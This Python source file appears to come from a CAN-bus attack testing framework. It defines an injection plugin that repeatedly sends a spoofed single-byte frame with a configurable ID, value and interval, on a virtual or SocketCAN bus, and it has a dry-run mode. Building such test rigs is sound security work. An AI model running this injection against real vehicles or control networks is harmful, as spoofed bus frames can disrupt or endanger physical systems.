# attacks/plugins/injection_plugin.py
import time
from typing import Dict, Any
from attacks.plugin_base import AttackPlugin
from utils.can_bus import make_bus
import can

class InjectionPlugin(AttackPlugin):
    """
    Injection plugin: repeatedly sends frames with one byte payload 'value'
    config keys:
      channel: (str) e.g. 'vcan0' or None for virtual
      bustype: 'socketcan' or 'virtual'
      id: int (CAN ID, default 0x100)
      value: int payload single byte (default 220)
      interval: float seconds between messages (default 0.1)
      duration: seconds total run-time (default None => run until stopped)
    """

    def _run(self):
        cfg = self.config
        bustype = cfg.get("bustype", "virtual")
        channel = cfg.get("channel", None)
        can_id = int(cfg.get("id", 0x100))
        val = int(cfg.get("value", 220))
        interval = float(cfg.get("interval", 0.1))
        duration = cfg.get("duration", None)

        if self.dry_run:
            print(f"[InjectionPlugin] DRY RUN: would inject id=0x{can_id:x} value={val}")
            # emulate behavior for logs
            start = time.time()
            while not self._stop_event.is_set():
                print(f"Injected {val}")
                time.sleep(interval)
                if duration and (time.time() - start) >= duration:
                    break
            return

        # make a bus (uses utils.make_bus, which handles interface/bustype differences)
        bus = make_bus(channel=channel, bustype=bustype)
        start = time.time()
        print(f"[InjectionPlugin] starting injection id=0x{can_id:x} value={val} on {bustype}/{channel}")

        while not self._stop_event.is_set():
            data = bytes([val])
            msg = can.Message(arbitration_id=can_id, data=data, is_extended_id=False)
            try:
                bus.send(msg)
            except Exception as e:
                print(f"[InjectionPlugin] send error: {e}")
            # small log for console
            print(f"Injected {val}")
            time.sleep(interval)
            if duration and (time.time() - start) >= duration:
                break

        print("[InjectionPlugin] finished")
